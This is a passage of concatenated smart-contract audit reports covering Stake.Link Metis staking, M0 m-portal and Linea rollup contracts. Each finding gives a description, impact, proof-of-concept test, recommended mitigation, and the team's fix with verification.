    await expect(l2Transmitter.executeUpdate({ value: toEther(10) })).to.be.revertedWithCustomError(
      withdrawalPool,
      'NoUpkeepNeeded'
    )
  })
```

**Recommended Mitigation:** In `L2Transmitter::executeQueuedWithdrawals`, consider calling `WithdrawalPool::performUpkeep` only when `WithdrawalPool::checkUpkeep` is `true`.

**Stake.Link**
Fixed in [835ed4e](https://github.com/stakedotlink/contracts/commit/835ed4e2d1695ef2e926b71caa724af28fc8f60c).

**Cyfrin**
Verified.


\clearpage
## Medium Risk


### Updating `operatorRewardPercentage` incorrectly redistributes already accrued rewards

**Description:** The `operatorRewardPercentage` in L1Strategy determines how rewards are split between operators and other recipients. When this percentage is changed, previously generated but undistributed rewards are calculated using the new percentage rather than the percentage that was in effect when they were generated.

Key code in `SequencerVault.sol`where rewards are calculated:

```solidity
// SequencerVault.sol
function updateDeposits(
    uint256 _minRewards,
    uint32 _l2Gas
) external payable onlyVaultController returns (uint256, uint256, uint256) {
    // Calculate total deposits and changes
    uint256 principal = getPrincipalDeposits();
    uint256 rewards = getRewards();
    uint256 totalDeposits = principal + rewards;
    int256 depositChange = int256(totalDeposits) - int256(uint256(trackedTotalDeposits));

    uint256 opRewards;
    if (depositChange > 0) {
        // Uses current operatorRewardPercentage for all accrued rewards
        opRewards = (uint256(depositChange) * vaultController.operatorRewardPercentage()) / 10000;
        trackedTotalDeposits = SafeCastUpgradeable.toUint128(totalDeposits);
    }
    //...
}
```
Consider the following scenario:

- operatorRewardPercentage = 10%
- 100 tokens of rewards accrue (10 for operators, 90 for others)
- operatorRewardPercentage changed to 25%
- On next update, same 100 tokens are split: 25 for operators, 75 for others
- Recipients lose 15 tokens they had effectively earned


**Impact:** _Changing percentage up_: Other recipients lose already earned rewards
_Changing percentage down_: Operators lose already earned rewards


**Recommended Mitigation:** Consider distributing the already earned rewards (if any) using the current `operatorRewardPercentage` before updating it to a new value. This would involve updating the deposits on the Strategy (which in turn would update the deposits on the SequencerVaults), and, send an update the L2 to mint the corresponding shares for the earned rewards.

**Stake.Link**
Fixed in [7c5d0aa](https://github.com/stakedotlink/contracts/commit/7c5d0aa923cecd705ca8e52888859ef9a71287d9).


**Cyfrin**
Verified. Explicit In-line comments added to run `executeUpdate` before updating operator reward percentage.


### Incorrect logic causes that SequencerVaults to not behave as expected when relocking or claiming rewards.

**Description:** A logic error exists in SequencerVault.updateDeposits() where rewards are not processed according to the function's documented behavior. According to the function in-line comments below, the comment `(set 0 to skip reward claiming)` indicates that when minRewards=0, the function should skip claiming but still process re-locking of rewards.

```solidity
//SequencerVault.sol
/**
 * @notice Updates the deposit and reward accounting for this vault
 * @dev will only pay out rewards if the vault is net positive when accounting for lost deposits
 * @param _minRewards min amount of rewards to relock/claim (set 0 to skip reward claiming) --> @audit
 * @param _l2Gas L2 gasLimit for bridging rewards
 * @return the current total deposits in this vault
 * @return the operator rewards earned by this vault since the last update
 * @return the rewards that were claimed in this update
 */
 function updateDeposits(
        uint256 _minRewards,
        uint32 _l2Gas
    ) external payable onlyVaultController returns (uint256, uint256, uint256) {
 // logic
}
```
However, the actual implementation:

```solidity
//SequencerVault.sol
function updateDeposits(
    uint256 _minRewards,
    uint32 _l2Gas
) external payable onlyVaultController returns (uint256, uint256, uint256) {
    uint256 principal = getPrincipalDeposits();
    uint256 rewards = getRewards();
    uint256 totalDeposits = principal + rewards;

    // ... code

    // Incorrectly skips all reward processing if minRewards=0
    if (_minRewards != 0 && rewards >= _minRewards) {
        if (
            (principal + rewards) <= vaultController.getVaultDepositMax() &&
            exitDelayEndTime == 0
        ) {
            lockingPool.relock(seqId, 0, true);
        } else {
            lockingPool.withdrawRewards{value: msg.value}(seqId, _l2Gas);
            trackedTotalDeposits -= SafeCastUpgradeable.toUint128(rewards);
            totalDeposits -= rewards;
            claimedRewards = rewards;
        }
    }
    // @audit No else block to handle relocking when minRewards=0

   // code..
    return (totalDeposits, opRewards, claimedRewards);
}
```

The implementation diverges from intended behavior:

When `minRewards=0`:
Expected: Skip claiming but process relocking
Actual: Skips all reward processing

**Impact:** When `minRewards == 0`, rewards are neither relocked nor claimed. This effectively leads to stuck rewards in `MetisLockingPool` until the sequencer is active.

**Proof of Concept:** Add the following to `l1-strategy.test.ts`

```solidity
 const setupSequencerWithRewards = async () => {
    const { strategy, metisLockingPool, token, accounts } = await loadFixture(deployFixture)

    // Setup vault and deposit initial amount
    await strategy.addVault('0x5555', accounts[1], accounts[2])
    const vaults = await strategy.getVaults()
    const vault0 = await ethers.getContractAt('SequencerVault', vaults[0])

    await strategy.deposit(toEther(500))

    await strategy.depositQueuedTokens([0], [toEther(500)])
    assert.equal(fromEther(await vault0.getPrincipalDeposits()), 500)
    assert.equal(fromEther(await vault0.getTotalDeposits()), 500)

    // Add rewards to sequencer
    await metisLockingPool.addReward(1, toEther(50))
    assert.equal(fromEther(await vault0.getTotalDeposits()), 550)

    return { strategy, vault0, metisLockingPool }
  }

  it('rewards not processed when minRewardsToClaim is 0', async () => {
    const { strategy, vault0, metisLockingPool } = await setupSequencerWithRewards()

    // Set minRewardsToClaim to 0
    await strategy.setMinRewardsToClaim(0)

    const rewardsBefore = await vault0.getRewards()
    assert.equal(fromEther(rewardsBefore), 50)

    // Update deposits
    await strategy.updateDeposits(0, 0)

    // Rewards should be relocked but aren't
    const rewardsAfter = await vault0.getRewards()
    assert.equal(fromEther(rewardsAfter), 50)
  })
```


**Recommended Mitigation:** Consider updating the current logic regarding reward management:
- rewards should be claimed when `minRewards > 0` && rewards exceed the minimum threshold!
- rewards should be relocked when `minRewards == 0`

**Stake.Link**
Fixed in commit [0ec7685](https://github.com/stakedotlink/contracts/commit/0ec7685bad34e28c680518c5fea6b46d2af24e7d)


**Cyfrin**
Verified. In-line comments updated to ensure consistency with implemented logic.

\clearpage
## Low Risk


### Transmitter address update can cause DoS for In-flight CCIP Messages

**Description:** The L1Transmitter and L2Transmitter contracts allow for updating the address of their counterpart transmitter on the other chain. However, this update mechanism does not account for in-flight CCIP messages, potentially causing them to be rejected upon arrival.

In `L1Transmitter.sol`:

```solidity
//L1Transmitter.sol
function setL2Transmitter(address _l2Transmitter) external onlyOwner {
    l2Transmitter = _l2Transmitter;
}

function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
    if (_message.sourceChainSelector != l2ChainSelector) revert InvalidSourceChain();
    if (abi.decode(_message.sender, (address)) != l2Transmitter) revert InvalidSender();
    // ... rest of the function
}
```

Similarly, in `L2Transmitter.sol`:

```solidity
function setL1Transmitter(address _l1Transmitter) external onlyOwner {
    l1Transmitter = _l1Transmitter;
}

function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
    if (_message.sourceChainSelector != l1ChainSelector) revert InvalidSourceChain();
    if (abi.decode(_message.sender, (address)) != l1Transmitter) revert InvalidSender();
    // ... rest of the function
}
```

The issue arises because the `_ccipReceive` function in both contracts checks the sender against the stored transmitter address. If this address is updated while there are messages in transit, those messages will be rejected upon arrival because their sender no longer matches the updated transmitter address.

**Impact:** Can lead to a Denial of Service for cross-chain communication. Any in-flight messages at the time of a transmitter address update will be rejected, potentially causing:

- Loss of critical updates or withdrawals
- Desynchronization of state between L1 and L2

**Recommended Mitigation:** Since both the transmitters are upgradeable, consider removing this function. When needed, the implementation of transmitter can be changed without having a need to update the address. Alternatively, make sure there are no in-flight messages when the owner is calling these functions to set a new address.

**Stake.Link**
Acknowledged. Owner will ensure there are no in-flight messages when calling these functions.

**Cyfrin**
Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-11-18-cyfrin-stake.link-metis-staking-v2.0.md ------


------ FILE START car/reports_md/2024-11-26-cyfrin-m0-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Immeas](https://twitter.com/0ximmeas)

**Assisting Auditors**



---

# Findings
## Medium Risk


### Cross-chain token transfer from `SpokeVault` fails due to approval from implementation contract instead of proxy

**Description:** [`SpokeVault`](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/src/SpokeVault.sol) is a contract that holds excess M tokens from Smart M and can transfer this excess to `HubVault` on mainnet via [`SpokeVault::transferExcessM`](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/src/SpokeVault.sol#L69-L89).

To enable this, an infinite approval is set in the [`SpokeVault` constructor](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/src/SpokeVault.sol#L63-L64):
```solidity
// Approve the SpokePortal to transfer M tokens.
IERC20(mToken).approve(spokePortal_, type(uint256).max);
```

However, `SpokeVault` is deployed as a proxy, as seen in [`DeployBase::_deploySpokeVault`](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/script/deploy/DeployBase.sol#L221-L235):
```solidity
spokeVaultImplementation_ = address(
    new SpokeVault(spokePortal_, hubVault_, destinationChainId_, migrationAdmin_)
);

spokeVaultProxy_ = _deployCreate3Proxy(address(spokeVaultImplementation_), _computeSalt(deployer_, "Vault"));
```
Where [`_deployCreate3Proxy`](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/script/helpers/Utils.sol#L102-L108) deploys an `ERC1967Proxy`.

As a result, the approval set in the constructor applies only to the implementation contract, not to the proxy, which holds the tokens and initiates the transfers.

**Impact:** `SpokeVault::transferExcessM` will not function as intended because the `Portal` requires approval to transfer tokens. The M tokens in `SpokeVault` will be effectively stuck, though not permanently, as the contract is upgradeable.

**Proof of Concept:** Adding a token transfer in [`MockSpokePortal::transfer`](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/test/mocks/MockSpokePortal.sol#L14-L21) will cause [`SpokeVaultTests::test_transferExcessM`](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/test/unit/Spokevault.t.sol#L115-L138) to fail:
```diff
+import { IERC20 } from "../../lib/common/src/interfaces/IERC20.sol";
...
    function transfer(
        uint256 amount,
        uint16 recipientChain,
        bytes32 recipient,
        bytes32 refundAddress,
        bool shouldQueue,
        bytes memory transceiverInstructions
    ) external payable returns (uint64) {
+       IERC20(mToken).transferFrom(msg.sender, address(this), amount);
    }
```

**Recommended Mitigation:** Consider setting token approvals only as needed in `transferExcessM` and removing the approval from the constructor:
```diff
+ IERC20(mToken).approve(spokePortal_, amount_);
  messageSequence_ = INttManager(spokePortal).transfer{ value: msg.value }(
      amount_,
      destinationChainId,
      hubVault_,
      refundAddress_,
      false,
      new bytes(1)
   );
```
In addition, this approach eliminates the infinite approval to an upgradeable contract, enhancing security.

**M0 Foundation**
Fixed in commit [78ac49b](https://github.com/m0-foundation/m-portal/commit/78ac49bba3ac294873a949eec00a5bfad8b41c34)

**Cyfrin**
Verified


### SpokeVault transfers will frequently revert due to Wormhole gas fee fluctuations

**Description:** The `SpokeVault.transferExcessM()` function forwards ETH to pay for Wormhole gas fees, but any excess ETH sent will cause the transaction to revert since `SpokeVault` lacks capability to receive ETH refunds. Current implementation only works if the user sends a fee that is exactly equal to the  wormhole gas fee at the time of transaction.

This creates a significant usability problem because Wormhole gas fees can fluctuate between the time a user calculates the fee off-chain and when their transaction is actually executed.

The following code in `ManagerBase::_prepareForTransfer` shows that any gas fee shortfall will revert the transaction. Also, any excess gas fee over and above the delivery fee is refunded back to the sender.

```solidity
// In ManagerBase.sol
function _prepareForTransfer(...) internal returns (...) {
    // ...
    if (msg.value < totalPriceQuote) {
        revert DeliveryPaymentTooLow(totalPriceQuote, msg.value);
    }

    uint256 excessValue = msg.value - totalPriceQuote;
    if (excessValue > 0) {
        _refundToSender(excessValue); // Reverts as SpokeVault can't accept ETH
    }
}

  function _refundToSender(
        uint256 refundAmount
    ) internal {
        // refund the price quote back to sender
        (bool refundSuccessful,) = payable(msg.sender).call{value: refundAmount}("");
         //@audit excess gas fee sent back to msg.sender (SpokeVault)

        // check success
        if (!refundSuccessful) {
            revert RefundFailed(refundAmount);
        }
    }
```


As a result, `transferExcessM` can only run if the user sends the exact fee. Doing so would be challenging because:

- Since this function can be called by anyone, it is likely that an average user would not know how to calculate the delivery fees
- Even if a user calculates the exact fee off-chain, it is highly likely that transaction fails due to natural gas fee fluctuation


**Impact:** If gas fee increases or decreases even slightly between quote and execution, transaction reverts.

**Proof of Concept**
Make following changes to `MockSpokePortal` and run the test below in `SpokeVault.t.sol`:

```solidity
      contract MockSpokePortal {
          address public immutable mToken;
          address public immutable registrar;

          constructor(address mToken_, address registrar_) {
              mToken = mToken_;
              registrar = registrar_;
          }

          function transfer(
              uint256 amount,
              uint16 recipientChain,
              bytes32 recipient,
              bytes32 refundAddress,
              bool shouldQueue,
              bytes memory transceiverInstructions
          ) external payable returns (uint64) {

              // mock return of excess fee back to sender
              if(msg.value > 1) {
                  payable(msg.sender).transfer(msg.value-1);
              }

          }
      }

   contract SpokeVaultTests is UnitTestBase {
        function testFail_transferExcessM() external { //@audits fails with excess fee
            uint256 amount_ = 1_000e6;
            uint256 balance_ = 10_000e6;
            uint256 fee_ = 2;
            _mToken.mint(address(_vault), balance_);
            vm.deal(_alice, fee_);

            vm.prank(_alice);
            _vault.transferExcessM{ value: fee_ }(amount_, _alice.toBytes32());
        }
   }

```

**Recommended Mitigation:** Wormhole has a specific provision to refund excess gas fee back to the sender. This is put in place to ensure reliability of transfers even with natural gas fee fluctuations.

Consider updating the `SpokeVault.transferExcessM()` function to handle excess ETH refunds by adding a `payable receive()` function in `SpokeVault`. Also, please make sure the logic forwards any received ETH back to the original caller - not doing so would result in the excess gas fee stuck inside `SpokeVault`.

**M0 Foundation**
Fixed in commit [78ac49b](https://github.com/m0-foundation/m-portal/commit/78ac49bba3ac294873a949eec00a5bfad8b41c34)

**Cyfrin**
Verified

\clearpage
## Informational


### `ExcessMTokenSent` event logs `messageSequence_` as `0` incorrectly

**Description:** When calling [`SpokeVault::transferExcessM`](https://github.com/m0-foundation/m-portal/blob/8f909076f4fc1f22028cabd6df8a9e6b5be4b078/src/SpokeVault.sol#L69-L89) to transfer excess M tokens from `SpokeVault`, an `ExcessMTokenSent` event is emitted:
```solidity
) external payable returns (uint64 messageSequence_) {
    ...

    // @audit messageSequence_ not assigned yet
    emit ExcessMTokenSent(destinationChainId, messageSequence_, msg.sender.toBytes32(), hubVault_, amount_);

    messageSequence_ = INttManager(spokePortal).transfer{ value: msg.value }(
        ...
    );
}
```
However, at the time the event is emitted, the `messageSequence_` value hasnt been assigned and will therefore always be 0.

**Recommended Mitigation:** Consider emitting the event after the `transfer` call, once `messageSequence_` has been assigned a valid value.

**M0 Foundation**
Fixed in commit [78ac49b](https://github.com/m0-foundation/m-portal/commit/78ac49bba3ac294873a949eec00a5bfad8b41c34)

**Cyfrin**
Verified

\clearpage

------ FILE END car/reports_md/2024-11-26-cyfrin-m0-v2.0.md ------


------ FILE START car/reports_md/2024-11-28-cyfrin-linea-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

**Assisting Auditors**

 


---

# Findings
## Medium Risk


### Operator can finalize for non-existent `finalShnarf`

**Description:** In the previous version of `LineaRollup::_finalizeBlocks` there was this check which ensured that the final shnarf was associated with a block number:
```solidity
if (
  shnarfFinalBlockNumbers[_finalizationData.finalSubmissionData.shnarf] !=
  _finalizationData.finalSubmissionData.finalBlockInData
) {
  revert FinalBlockDoesNotMatchShnarfFinalBlock(
    _finalizationData.finalSubmissionData.finalBlockInData,
    shnarfFinalBlockNumbers[_finalizationData.finalSubmissionData.shnarf]
  );
}
```

In the new version `shnarfFinalBlockNumbers` was changed to `blobShnarfExists` which links a shnarf to an effective boolean flag (though as an uint due to previous definition), and the above check was removed but no similar check was implemented.

**Impact:** An operator can finalize for non-existent `finalShnarf`.

**Recommended Mitigation:** Add an equivalent check in `LineaRollup::_finalizeBlocks` to verify that the computed `finalShnarf` exists:
```solidity
finalShnarf = _computeShnarf(
  _finalizationData.shnarfData.parentShnarf,
  _finalizationData.shnarfData.snarkHash,
  _finalizationData.shnarfData.finalStateRootHash,
  _finalizationData.shnarfData.dataEvaluationPoint,
  _finalizationData.shnarfData.dataEvaluationClaim
);

// @audit prevent finalization for non-existent final shnarf
if(blobShnarfExists[finalShnarf] == 0) revert FinalBlobNotSubmitted();
```

**Linea:** Fixed in [PR226](https://github.com/Consensys/linea-monorepo/pull/226) commit [4286bdb](https://github.com/Consensys/linea-monorepo/pull/226/commits/4286bdbd03a0d447adf60dba6d26680503c2a14f).

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Operator can submit data via `LineaRollup::submitDataAsCalldata` for invalid parent shnarf

**Description:** `LineaRollup::submitBlobs` has this check to validate the parent shnarf exists:
```solidity
    if (blobShnarfExists[_parentShnarf] == 0) {
      revert ParentBlobNotSubmitted(_parentShnarf);
    }
```

But `LineaRollup::submitDataAsCalldata` has no similar check, meaning that an operator can submit data for an invalid parent shnarf by calling `submitDataAsCalldata`.

**Linea:** Fixed in [PR223](https://github.com/Consensys/linea-monorepo/pull/223) commit [8800eaa](https://github.com/Consensys/linea-monorepo/pull/223/commits/8800eaa2fd9f45b9048b29caaeee939ade01e317).

**Cyfrin:** Verified.

\clearpage
## Informational


### Use SafeCast or document assumption that unsafe downcast in `SparkeMerkleTreeVerifier::_verifyMerkleProof` can't overflow

**Description:** `SparkeMerkleTreeVerifier::_verifyMerkleProof` has added the following sanity check:
```solidity
uint32 maxAllowedIndex = uint32((2 ** _proof.length) - 1);
if (_leafIndex > maxAllowedIndex) {
  revert LeafIndexOutOfBounds(_leafIndex, maxAllowedIndex);
}
```

If `_proof.length` > 32 this would overflow as in Solidity casts don't revert but overflow.

The team has stated that _"it is based on the Merkle tree depth coming from the finalization where the length is checked against the depth. That currently is set at 5 and is unlikely to change"._

So the overflow appears to be impossible in practice, however we recommend either:

* using [SafeCast](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol#L509-L514) to revert if an overflow did occur
* explicitly documenting the assumption that an overflow can't occur in the code

The risk with the comment approach is that in the future the related code in finalization can be changed without the dev realizing that would trigger an overflow in this place.

**Linea:** Fixed in [PR222](https://github.com/Consensys/linea-monorepo/pull/222) commits [c20b938](https://github.com/Consensys/linea-monorepo/pull/222/commits/c20b9380dd55237a6cbc65826d17c85cb68afe5b) & [77a6e99](https://github.com/Consensys/linea-monorepo/pull/222/commits/77a6e99bc4413c8e445f795a35ff8b4cddbcadb9).

**Cyfrin:** Verified.


### Mark `L1MessageManagerV1::outboxL1L2MessageStatus` as deprecated

**Description:** `L1MessageManagerV1::outboxL1L2MessageStatus` is never read or written to anymore apart from the test suite:
```
$ rg "outboxL1L2MessageStatus"
test-contracts/TestL1MessageManager.sol
31:    outboxL1L2MessageStatus[_messageHash] = OUTBOX_STATUS_SENT;
39:      uint256 existingStatus = outboxL1L2MessageStatus[messageHash];
46:        outboxL1L2MessageStatus[messageHash] = OUTBOX_STATUS_RECEIVED;

messageService/l1/v1/L1MessageManagerV1.sol
22:  mapping(bytes32 messageHash => uint256 messageStatus) public outboxL1L2MessageStatus;

test-contracts/LineaRollupV5.sol
1944:  mapping(bytes32 messageHash => uint256 messageStatus) public outboxL1L2MessageStatus;

test-contracts/LineaRollupAlphaV3.sol
2011:  mapping(bytes32 messageHash => uint256 messageStatus) public outboxL1L2MessageStatus;

tokenBridge/mocks/MessageBridgeV2/MockMessageServiceV2.sol
40:    outboxL1L2MessageStatus[messageHash] = OUTBOX_STATUS_SENT;
```

Therefore it should be marked as deprecated with a comment similar to how `LineaRollup` handles its deprecated mappings.

Similarly `L1MessageManagerV1::inboxL2L1MessageStatus` is only ever deleted from but no new mappings are inserted; ideally a comment should also indicate this.

**Linea:** Fixed in [PR256](https://github.com/Consensys/linea-monorepo/pull/256) commit [ac51e9e](https://github.com/Consensys/linea-monorepo/pull/256/commits/ac51e9e57050f1fae13f6446a890250403e74b10#diff-231d964c3a2bc0ac9159b40fa3ab1196ee50417232c63df839d83cec34250d49L19-R26).

**Cyfrin:** Verified.


### Remove comments which no longer apply

**Description:** Comments which no longer apply should be removed as they are now misleading.

File: `L1MessageServiceV1.sol`
```solidity
// @audit `claimMessage` no longer uses `_messageSender` so these comments are incorrect
   * @dev _messageSender is set temporarily when claiming and reset post. Used in sender().
   * @dev _messageSender is reset to DEFAULT_SENDER_ADDRESS to be more gas efficient.
```

File: `L1MessageService.sol`
```solidity
// @audit `_messageSender` no longer initialized as it is not used anymore by L1 Messaging
   * @dev _messageSender is initialised to a non-zero value for gas efficiency on claiming.
```

**Linea:** Fixed in [PR256](https://github.com/Consensys/linea-monorepo/pull/256) commits [ac51e9e](https://github.com/Consensys/linea-monorepo/pull/256/commits/ac51e9e57050f1fae13f6446a890250403e74b10#diff-e9f6a0c3577321e5aa88a9d7e12499c2c4819146062e33a99576971682396bb5L101-R102) & [b875723](https://github.com/Consensys/linea-monorepo/commit/b875723765ceeeccbbdf1a0a747884ad7589001e).

**Cyfrin:** Verified.


### Use named mappings in `TokenBridge` and remove obsolete comments

**Description:** `TokenBridge` should use named mappings and remove obsolete comments:
```diff
-   /// @notice mapping (chainId => nativeTokenAddress => brigedTokenAddress)
-   mapping(uint256 => mapping(address => address)) public nativeToBridgedToken;
-   /// @notice mapping (brigedTokenAddress => nativeTokenAddress)
-   mapping(address => address) public bridgedToNativeToken;

+   mapping(uint256 chainId => mapping(address native => address bridged)) public nativeToBridgedToken;
+   mapping(address bridged => address native) public bridgedToNativeToken;
```

**Linea:** Fixed in [PR256](https://github.com/Consensys/linea-monorepo/pull/256) commit [ac51e9e](https://github.com/Consensys/linea-monorepo/pull/256/commits/ac51e9e57050f1fae13f6446a890250403e74b10#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L62-R74).

**Cyfrin:** Verified.


### `L2MessageService::reinitializePauseTypesAndPermissions` should use `reinitializer(2)`

**Description:** `TokenBridge::reinitializePauseTypesAndPermissions` uses `reinitializer(2)` because:
```
export ETH_RPC_URL=mainnet_rpc
cast storage 0x051F1D88f0aF5763fB888eC4378b4D8B29ea3319 0
0x0000000000000000000000000000000000000000000000000000000000000001
export ETH_RPC_URL=linea_rpc
cast storage 0x353012dc4a9A6cF55c941bADC267f82004A8ceB9 0
0x0000000000000000000000000000000000000000000000000000000000000001
```

`LineaRollup::reinitializeLineaRollupV6` uses `reinitializer(6)` because:
```
export ETH_RPC_URL=mainnet_rpc
cast storage 0xd19d4B5d358258f05D7B411E21A1460D11B0876F 0
0x0000000000000000000000000000000000000000000000000000000000000005
```

But `L2MessageService::reinitializePauseTypesAndPermissions` uses `reinitializer(6)` even though:
```
export ETH_RPC_URL=linea_rpc
cast storage 0x508Ca82Df566dCD1B0DE8296e70a96332cD644ec 0
0x0000000000000000000000000000000000000000000000000000000000000001
```

For consistency `L2MessageService::reinitializePauseTypesAndPermissions` should use `reinitializer(2)`.

**Linea:** Fixed in [PR271](https://github.com/Consensys/linea-monorepo/pull/271) commit [53f43d3](https://github.com/Consensys/linea-monorepo/pull/271/commits/53f43d3d6f6c49556e4da49af53e5db3aa2bfa24).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Remove redundant `L2MessageManagerV1::__L2MessageManager_init` and associated constant

**Description:** `L2MessageManagerV1::__L2MessageManager_init` is no longer called by `L2MessageService::initialize` which uses the new `PermissionsManager` contract.

Hence it should be removed along with its associated constant `L1_L2_MESSAGE_SETTER_ROLE`. This constant is referenced in comments throughout the code so those should also be updated.

The test suite still contains calls to `L2MessageManagerV1::__L2MessageManager_init`; the test suite should also be updated use only the new method for initialisation.
```solidity
// output of: rg "__L2MessageManager_init"
messageService/l2/v1/L2MessageManagerV1.sol
39:  function __L2MessageManager_init(address _l1l2MessageSetter) internal onlyInitializing {

test-contracts/TestL2MessageManager.sol
32:    __L2MessageManager_init(_l1l2MessageSetter);
41:    __L2MessageManager_init(_l1l2MessageSetter);

test-contracts/L2MessageServiceLineaMainnet.sol
1620:  function __L2MessageManager_init(address _l1l2MessageSetter) internal onlyInitializing {
1992:    __L2MessageManager_init(_l1l2MessageSetter);

// output of: rg "L1_L2_MESSAGE_SETTER_ROLE"
messageService/l2/L2MessageManager.sol
26:   * @dev Only address that has the role 'L1_L2_MESSAGE_SETTER_ROLE' are allowed to call this function.
40:  ) external whenTypeNotPaused(PauseType.GENERAL) onlyRole(L1_L2_MESSAGE_SETTER_ROLE) {

messageService/l2/v1/L2MessageManagerV1.sol
18:  bytes32 public constant L1_L2_MESSAGE_SETTER_ROLE = keccak256("L1_L2_MESSAGE_SETTER_ROLE");
37:   * @param _l1l2MessageSetter The address owning the L1_L2_MESSAGE_SETTER_ROLE role.
40:    _grantRole(L1_L2_MESSAGE_SETTER_ROLE, _l1l2MessageSetter);

interfaces/l2/IL2MessageManager.sol
48:   * @dev Only address that has the role 'L1_L2_MESSAGE_SETTER_ROLE' are allowed to call this function.

test-contracts/L2MessageServiceLineaMainnet.sol
1601:  bytes32 public constant L1_L2_MESSAGE_SETTER_ROLE = keccak256("L1_L2_MESSAGE_SETTER_ROLE");
1618:   * @param _l1l2MessageSetter The address owning the L1_L2_MESSAGE_SETTER_ROLE role.
1621:    _grantRole(L1_L2_MESSAGE_SETTER_ROLE, _l1l2MessageSetter);
1626:   * @dev Only address that has the role 'L1_L2_MESSAGE_SETTER_ROLE' are allowed to call this function.
1629:  function addL1L2MessageHashes(bytes32[] calldata _messageHashes) external onlyRole(L1_L2_MESSAGE_SETTER_ROLE) {
```

**Linea:** Fixed in [PR212](https://github.com/Consensys/linea-monorepo/pull/212) commit [3b30a8a](https://github.com/Consensys/linea-monorepo/pull/212/commits/3b30a8aa083bfe77fa6e73ca3950343f250f482b).

**Cyfrin:** Verified.


### Cheaper to not cache `calldata` array length

**Description:** When an array is passed as `calldata` it is [cheaper not to cache the length](https://x.com/DevDacian/status/1791490921881903468):
```diff
// PermissionsManager::__Permissions_init
  function __Permissions_init(RoleAddress[] calldata _roleAddresses) internal onlyInitializing {
-    uint256 roleAddressesLength = _roleAddresses.length;

-    for (uint256 i; i < roleAddressesLength; i++) {
+    for (uint256 i; i < _roleAddresses.length; i++) {
```

The same applies to:
* `PauseManager::__PauseManager_init`
* `LineaRollup::submitBlobs`
* `L2MessageManager::anchorL1L2MessageHashes`

**Linea:** Fixed in [PR247](https://github.com/Consensys/linea-monorepo/pull/247) commits [8bf9d86](https://github.com/Consensys/linea-monorepo/pull/247/commits/8bf9d867bb0fa3f9f5956efa3d8e90f4e21cf4ee), [0ffc752](https://github.com/Consensys/linea-monorepo/pull/247/commits/0ffc752c126c419d67d70260065996d4ad2545b5) & commit [968b257](https://github.com/Consensys/linea-monorepo/pull/247/commits/968b25795d1323d83360cbc3be3480a861b12aac).

**Cyfrin:** Verified.


### Use named return variables to save at least 9 gas per variable

**Description:** Using [named return variables](https://x.com/DevDacian/status/1796396988659093968) saves at least 9 gas per variable; named returns are already used in some functions of the protocol but not in others:
```solidity
PauseManager.sol
136:  function isPaused(PauseType _pauseType) public view returns (bool)

l1/L1MessageManager.sol
98:  function isMessageClaimed(uint256 _messageNumber) external view returns (bool) {

l1/L1MessageService.sol
150:  function sender() external view returns (address addr) {

l2/v1/L2MessageServiceV1.sol
165:  function sender() external view returns (address) {

lib/SparseMerkleTreeVerifier.sol
32:  ) internal pure returns (bool) {

TokenBridge.sol
 function _safeName(address _token) internal view returns (string memory) {
  function _safeSymbol(address _token) internal view returns (string memory) {
  function _safeDecimals(address _token) internal view returns (uint8) {
  function _returnDataToString(bytes memory _data) internal pure returns (string memory) {
```

**Linea:** Fixed in [PR247](https://github.com/Consensys/linea-monorepo/pull/247) commit [968b257](https://github.com/Consensys/linea-monorepo/pull/247/commits/968b25795d1323d83360cbc3be3480a861b12aac).

**Cyfrin:** Verified.


### Cache storage variables to avoid multiple identical storage reads

**Description:** Cache storage variables to avoid multiple identical storage reads:

File: `TokenBridge.sol`
```solidity
// @audit use `_initializationData.sourceChainId` instead of `sourceChainId`
147:        nativeToBridgedToken[sourceChainId][_initializationData.reservedTokens[i]] = RESERVED_STATUS;

// @audit cache 'sourceChainId' from storage and use cached copy
371:        nativeToBridgedToken[sourceChainId][_nativeTokens[i]] = DEPLOYED_STATUS;
```

**Linea:** Fixed in [PR247](https://github.com/Consensys/linea-monorepo/pull/247) commit [968b257](https://github.com/Consensys/linea-monorepo/pull/247/commits/968b25795d1323d83360cbc3be3480a861b12aac#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L147-R374).

**Cyfrin:** Verified.


### Fail fast in `LineaRollup::submitBlobs` and `submitDataAsCalldata`

**Description:** `LineaRollup::submitBlobs` does a lot of processing then after the `for` loop there is this first check which ensures the computed shnarf matches the provided expected input:
```solidity
if (_finalBlobShnarf != computedShnarf) {
  revert FinalShnarfWrong(_finalBlobShnarf, computedShnarf);
}
```

If the first check did not revert, this means that `_finalBlobShnarf == computedShnarf`.

Then a second check reverts if this schnarf already exists:
```solidity
if (blobShnarfExists[computedShnarf] != 0) {
  revert DataAlreadySubmitted(computedShnarf);
}
```

But since the second check can only execute if `_finalBlobShnarf == computedShnarf`, it is much more efficient to delete the second check and put a new check at the beginning of the function like this:
```solidity
if (blobShnarfExists[_finalBlobShnarf] != 0) {
  revert DataAlreadySubmitted(_finalBlobShnarf);
}
```

Ideally the beginning of the function would have these 4 checks before doing or declaring anything else:
```solidity
  function submitBlobs(
    BlobSubmission[] calldata _blobSubmissions,
    bytes32 _parentShnarf,
    bytes32 _finalBlobShnarf
  ) external whenTypeAndGeneralNotPaused(PauseType.BLOB_SUBMISSION) onlyRole(OPERATOR_ROLE) {
